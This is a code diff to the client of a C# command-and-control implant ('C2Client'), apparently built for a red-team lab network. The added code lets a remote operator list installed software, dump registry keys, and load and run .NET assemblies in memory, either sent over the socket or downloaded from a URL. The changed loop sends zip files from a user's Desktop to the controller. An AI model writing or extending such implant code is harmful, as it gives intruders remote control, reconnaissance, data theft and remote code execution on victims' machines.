@@ -18,6 +18,8 @@ using System.DirectoryServices.AccountManagement;
 using System.Collections;
 using System.Security.Principal;
 using System.Security.AccessControl;
+using Microsoft.Win32;
+using System.Reflection;
 
 namespace C2Client
 {
@@ -129,11 +131,12 @@ namespace C2Client
                 }
                 ps.Stop();
                 r.Close();
-                Thread.Sleep(5000);
+                //Thread.Sleep(5000);
                 result = sw.ToString();
                 Console.WriteLine("Result is " + result);
 
-                var files = Directory.EnumerateFiles(@"C:\Users\Administrator\Desktop", "pwn*temp.zip", SearchOption.AllDirectories);
+                var files = Directory.EnumerateFiles(@"C:\Users\blairej.THROWBACK\Desktop", "pwn*temp.zip");
+                
                 foreach (string f in files)
                 {
                     Console.WriteLine(f);
@@ -145,7 +148,7 @@ namespace C2Client
                     c.Send(File.ReadAllBytes(f));
                    Console.WriteLine(File.ReadAllBytes(f).Length);
                     // Thread.Sleep(2000);
-                    File.Delete(f);
+                    //File.Delete(f);
 
                 }
 
@@ -474,6 +477,330 @@ namespace C2Client
             return result;
         }
 
+        public string GetSoftware(string RegistryKeyValue)
+        {
+            string result;
+            StringWriter sw = new StringWriter();
+
+            RegistryKey rkey = Registry.LocalMachine.OpenSubKey(RegistryKeyValue);
+
+            string[] subkeys = rkey.GetSubKeyNames();
+
+            foreach (string subkey in subkeys)
+            {
+                string nextkey = RegistryKeyValue + @"\" + subkey;
+                RegistryKey childkey = Registry.LocalMachine.OpenSubKey(nextkey);
+
+
+                sw.WriteLine("{0} -------- {1}", childkey.GetValue("DisplayName"), childkey.GetValue("DisplayVersion"));
+
+
+            }
+            result = sw.ToString();
+            return result;
+        }
+
+        public string GetRegSubKeysandValues(string RegKey)
+        {
+            string result;
+            StringWriter sw = new StringWriter();
+
+            if (RegKey.Contains("HKCR"))
+            {
+                RegistryKey hkcr = Registry.ClassesRoot;
+                string[] subkeys;
+                if (RegKey == "HKCR")
+                {
+
+                    subkeys = hkcr.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+                    result = sw.ToString();
+                    return result;
+                }
+                else
+                {
+                   string childkeyname= RegKey.ToString().Remove(0, 5);
+                   RegistryKey childkey= hkcr.OpenSubKey(childkeyname);
+                    subkeys = childkey.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+                    sw.WriteLine("-----------Values----------");
+                    string[] valuenames = childkey.GetValueNames();
+                    foreach (string value in valuenames)
+                    {
+                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
+                    }
+
+
+                    if (subkeys.Length == 0)
+                    {
+                        string[] values = childkey.GetValueNames();
+                        foreach (string valuename in values)
+                        {
+                            string value = childkey.GetValue(valuename).ToString();
+                            sw.WriteLine("{0} -------> {1}", valuename, value);
+                        }
+                        result = sw.ToString();
+                        return result;
+                    }
+                    
+                }
+                
+                
+            }
+
+
+            else if (RegKey.Contains("HKCU"))
+            {
+
+                RegistryKey hkcu = Registry.CurrentUser;
+                string[] subkeys;
+                if (RegKey == "HKCU")
+                {
+
+                    subkeys = hkcu.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+                    result = sw.ToString();
+                    return result;
+
+                }
+                else
+                {
+                    string childkeyname = RegKey.ToString().Remove(0, 5);
+                    RegistryKey childkey = hkcu.OpenSubKey(childkeyname);
+                    subkeys = childkey.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+
+                    sw.WriteLine("-----------Values----------");
+                    string[] valuenames = childkey.GetValueNames();
+                    foreach(string value in valuenames)
+                    {
+                        sw.WriteLine("{0} ------> {1}",value,childkey.GetValue(value).ToString());
+                    }
+
+                    if (subkeys.Length == 0)
+                    {
+                        string[] values = childkey.GetValueNames();
+                        foreach (string valuename in values)
+                        {
+                            string value = childkey.GetValue(valuename).ToString();
+                            sw.WriteLine("{0} -------> {1}", valuename, value);
+                        }
+                        result = sw.ToString();
+                        return result;
+                    }
+                    
+                }
+                
+                /*sw.WriteLine("---------Values--------");
+                string childkeyname2 = RegKey.ToString().Remove(0, 5);
+                RegistryKey childkey2 = hkcu.OpenSubKey(childkeyname2);
+                string[] valuenames =childkey2.GetValueNames();
+                foreach(string value in valuenames)
+                {
+                    sw.WriteLine(value);
+                }*/
+
+                result = sw.ToString();
+                return result;
+            }
+
+            else if (RegKey.Contains("HKLM"))
+            {
+
+                RegistryKey hklm = Registry.LocalMachine;
+                string[] subkeys;
+                if (RegKey == "HKLM")
+                {
+
+                    subkeys = hklm.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+                    result = sw.ToString();
+                    return result;
+                }
+                else
+                {
+                    string childkeyname = RegKey.ToString().Remove(0, 5);
+                    Console.WriteLine("childkey {0}",childkeyname);
+                    RegistryKey childkey = hklm.OpenSubKey(childkeyname);
+                    subkeys = childkey.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+
+                    sw.WriteLine("-----------Values----------");
+                    string[] valuenames = childkey.GetValueNames();
+                    foreach (string value in valuenames)
+                    {
+                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
+                    }
+
+
+
+
+                    if (subkeys.Length == 0)
+                    {
+                        string[] values = childkey.GetValueNames();
+                        foreach (string valuename in values)
+                        {
+                            string value = childkey.GetValue(valuename).ToString();
+                            sw.WriteLine("{0} -------> {1}", valuename, value);
+                        }
+                        result = sw.ToString();
+                        return result;
+                    }
+                    
+                }
+                
+                
+            }
+
+            else if (RegKey.Contains("HKUSERS"))
+            {
+
+                RegistryKey hkusers = Registry.Users;
+                string[] subkeys;
+                if (RegKey == "HKUSERS")
+                {
+
+                    subkeys = hkusers.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+                    result = sw.ToString();
+                    return result;
+                }
+                else
+                {
+                    string childkeyname = RegKey.ToString().Remove(0, 8);
+                    RegistryKey childkey = hkusers.OpenSubKey(childkeyname);
+                    subkeys = childkey.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+
+                    sw.WriteLine("-----------Values----------");
+                    string[] valuenames = childkey.GetValueNames();
+                    foreach (string value in valuenames)
+                    {
+                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
+                    }
+
+                    if (subkeys.Length == 0)
+                    {
+                        string[] values = childkey.GetValueNames();
+                        foreach(string valuename in values)
+                        {
+                           string value= childkey.GetValue(valuename).ToString();
+                            sw.WriteLine("{0} -------> {1}", valuename, value);
+                        }
+                        result = sw.ToString();
+                        return result;
+                    }
+                    
+                }
+                
+                
+            }
+
+            else if (RegKey.Contains("HKCURRENT_CONFIG"))
+            {
+
+                RegistryKey hkcconfig = Registry.CurrentConfig;
+                string[] subkeys;
+                if (RegKey == "HKCURRENT_CONFIG")
+                {
+
+                    subkeys = hkcconfig.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+                    result = sw.ToString();
+                    return result;
+
+                }
+                else
+                {
+                    string childkeyname = RegKey.ToString().Remove(0, 17);
+                    RegistryKey childkey = hkcconfig.OpenSubKey(childkeyname);
+                    subkeys = childkey.GetSubKeyNames();
+                    foreach (string subkey in subkeys)
+                    {
+                        sw.WriteLine(subkey);
+                    }
+
+                    sw.WriteLine("-----------Values----------");
+                    string[] valuenames = childkey.GetValueNames();
+                    foreach (string value in valuenames)
+                    {
+                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
+                    }
+
+                    if (subkeys.Length == 0)
+                    {
+                        string[] values = childkey.GetValueNames();
+                        foreach (string valuename in values)
+                        {
+                            string value = childkey.GetValue(valuename).ToString();
+                            sw.WriteLine("{0} -------> {1}", valuename, value);
+                        }
+                        result = sw.ToString();
+                        return result;
+                    }
+                    
+                }
+                
+                
+            }
+
+            result = sw.ToString();
+            return result;
+        }
+
+        public void ReflectionLoadFile(byte[] toload)
+        {
+            try
+            {
+                Assembly assembly = Assembly.Load(toload);
+                string[] newargs = { };
+                assembly.EntryPoint.Invoke(null, new object[] { newargs });
+
+            }
+            catch { }
+            
+        }
+
+        public void ReflectionLoadUrl(string url)
+        {
+            try
+            {
+                WebClient wc = new WebClient();
+                byte[] filecontent = wc.DownloadData(url);
+                Assembly assembly = Assembly.Load(filecontent);
+                string[] newargs = { };
+                assembly.EntryPoint.Invoke(null, new object[] { newargs });
+            }
+            catch { }
+        }
+
         public static void Main(string[] args)
         {
             if (args.Length != 4)
@@ -723,6 +1050,88 @@ namespace C2Client
 
 
 
+                    }
+
+                    else if (cmd == "Get-InstalledSoftware")
+                    {
+
+                        string programs64 = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
+                        string programs32 = @"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall";
+
+                        try
+                        {
+                            Program p1 = new Program();
+                            string softwares1 = "--------64 BIT PROGRAMS-------\n";
+                            try
+                            {
+                                softwares1 += p1.GetSoftware(programs64);
+                            }
+                            catch { }
+                            try
+                            {
+                                softwares1 += "--------32 BIT PROGRAMS-------\n";
+                                softwares1 += p1.GetSoftware(programs32);
+                                cmd = softwares1;
+                            }
+                            catch { }
+                            Console.WriteLine(softwares1);
+                        }
+                        catch { }
+
+                        
+
+                    }
+
+
+                    else if (cmd.Contains("getregistry-"))
+                    {
+                        string regpath = "";
+                        for(int i = 12; i < cmd.Length; i++)
+                        {
+                            regpath += cmd[i];
+                        }
+                        Console.WriteLine(regpath);
+                        Program p = new Program();
+                        Thread reg = new Thread(() =>
+                        {
+                           cmd = p.GetRegSubKeysandValues(regpath);
+                        });
+                        reg.Start();
+                        reg.Join();
+
+
+                    }
+
+                    else if (cmd.Contains("loadfile-"))
+                    {
+                        // get contents and load 
+                        Console.WriteLine("Loading file");
+                        byte[] toload = new byte[1024000000];
+                        Array.Clear(toload, 0, toload.Length);
+                        cs.Receive(toload);
+
+                        Thread loader = new Thread(() =>
+                        {
+                            Program p1 = new Program();
+                            p1.ReflectionLoadFile(toload);
+                        });
+                        loader.Start();
+                        cmd = "Started Loading...";
+
+                    }
+
+                    else if (cmd.Contains("loadurl-"))
+                    {
+                        // extract url, download data and invoke
+                        string url =cmd.Remove(0, 8);
+                        Console.WriteLine(url);
+                        Thread loadurl = new Thread(() =>
+                        {
+                            Program p1 = new Program();
+                            p1.ReflectionLoadUrl(url);
+                        });
+                        loadurl.Start();
+                        cmd = "Started Loading from url...";
                     }
 
                     else
